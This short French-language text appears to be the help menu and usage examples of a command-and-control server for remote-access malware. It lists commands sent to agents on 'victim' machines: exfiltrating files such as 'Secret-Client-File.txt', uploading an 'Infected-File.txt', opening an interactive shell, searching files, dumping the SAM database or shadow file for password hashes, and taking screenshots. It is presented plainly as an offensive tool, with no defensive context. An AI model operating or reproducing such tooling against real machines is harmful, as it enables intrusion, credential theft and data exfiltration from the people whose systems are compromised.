1 - Linux
[i] help         : Affiche ce message d'aide
[i] list         : Liste tous les agents connectés

[i] <agent_id> <commande> : Envoie une commande à l'agent spécifié (ex: '1 upload /path/to/file')


[i] Commandes à envoyer aux agents (précisez l'agent_id avant la commande):

[i]   download <path>     : Télécharge des fichiers de la victime vers le serveur
1 download Secret-Client-File.txt

[i]   upload <path>       : Upload des fichiers du serveur vers la victime
1 upload Infected-File.txt

[i]   shell               : Ouvre un shell interactif (bash ou cmd)
[i]   ipconfig            : Obtient la configuration réseau de la machine victime
[i]   search <file>       : Recherche un fichier sur la machine victime
1 search Infected-File.txt


[i]   hashdump            : Récupère la base SAM ou le fichier shadow de la machine victime
1 hashdump

[i]   screenshot          : Prend une capture d'écran de la machine victime
screenshot


